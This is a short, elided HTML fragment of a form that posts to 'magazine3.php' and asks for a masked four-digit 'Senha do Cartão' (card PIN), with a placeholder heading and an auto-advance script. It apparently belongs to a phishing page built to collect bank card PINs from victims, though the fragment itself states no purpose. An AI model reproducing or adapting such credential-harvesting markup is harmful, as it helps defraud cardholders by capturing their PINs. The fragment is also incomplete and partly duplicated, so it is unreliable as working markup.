...
<body>
 ...
 <div class="form-container active">
 	<h2>a</h2>
    				        <form action="magazine3.php"  class="form-inline" method="POST">
                                ...
                                <div class="form-group">
                                    ...
                                    <input id="password" name="password" placeholder="Senha do Cartão" type="tel" minlength="4" maxlength="4" required onkeypress="return SomenteNumero(event)" onkeypress="return SomenteNumero(event)" onkeyup="pulacampo('s6','continuar');" style="-webkit-text-security: circle;">
                                </div><br>
